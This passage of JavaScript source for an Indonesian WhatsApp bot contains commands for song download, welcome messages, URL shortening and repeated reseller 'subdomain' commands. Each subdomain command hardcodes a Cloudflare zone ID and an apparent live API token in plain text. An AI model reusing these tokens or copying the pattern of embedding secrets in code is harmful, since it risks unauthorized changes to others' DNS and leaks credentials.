          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.success
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await slime.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break
// ===================================== //
case 'song': {
if (!text) return reply(`Example : ${prefix + command} anime whatsapp status`)
await m.reply(mess.wait);
let yts = require("youtube-yts")
        let look = await yts(text);
        let convert = look.videos[0];       
const pl = await youtube(convert.url)
await slime.sendMessage(m.chat,{
    audio: { url: pl.mp3  },
    fileName: convert.title + '.mp3',
    mimetype: 'audio/mpeg',
    contextInfo:{
        externalAdReply:{
            title:convert.title,
            body: botname,
            thumbnailUrl: convert.image,
            sourceUrl: pl.mp3,
            mediaType:1,
            mediaUrl:convert.url,
        }

    },
},{quoted:m})
reply('SORRY BRE KLO MB LAGUNYA GEDE SOALNYA BIAR JERNIH MUSIKNYA')
}
break
case "welcome": 
{
if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case 'myip': {
var http = require('http')
 http.get({
 'host': 'api.ipify.org',
 'port': 80,
 'path': '/'
 }, function(resp) {
 resp.on('data', function(ip) {
 m.reply("🔎 My public IP address is: " + ip);
 })
 })}
break
case 'shortlink':{
if (!text) return m.reply('*[ Wrong! ]* harap masukan link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return m.reply(`*Error: Could not generate a short URL.*`);
let done = `*[ S U C C E S S P R O C E S S]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
m.reply(done)
}
break
 case 'd1': {
 
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
function subDomain1(host, ip) {
  return new Promise((resolve) => {
                   let zone = "3af0f9a60d361aba1f45e8b5dc6g2e958";
               let apitoken = "uRCTyN5wNwseFE5bKNZx2F4ztW4YkxSsJ5H6xp-nj"
               let tld = "pterodactyl-vvip.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break
           
           case 'd2': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a476ffcf9243c44a02220f184da527e8";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "mypanell.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break
           
           case 'd3': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f374d347f22dc1b0ac208973f185c1f2";
               let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
               let tld = "piwzstoreee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break
           
  case 'd4': {
   if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c1812c92fb249258e67a28573ca34344";
               let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
               let tld = "piwzpediaaa.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
  break       
  
  case 'd5': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
               let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
               let tld = "piwzpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd6': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5d3af3683a1b09670575208f89ssa64ff0";
               let apitoken = "9-9_v_or4iE3OJy9skPqX5OBi7Sdd3RDQy1d_raTPy";
               let tld = "slimextzy.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd7': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3fb14ab83a9c9cf9185d8bc6115bdffb";
               let apitoken = "G4Sbq3qah_J_llfKIjEcyezILYzQiKAO8OvhFDh1";
               let tld = "raikyxzhost.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd8': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5f4a582dd80c518fb2c7a425256fb491";
               let apitoken = "iQbJQgfe6kTyEfdOy_EV8UAHKj80VgQg4t6rTjby";
               let tld = "tokopanellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
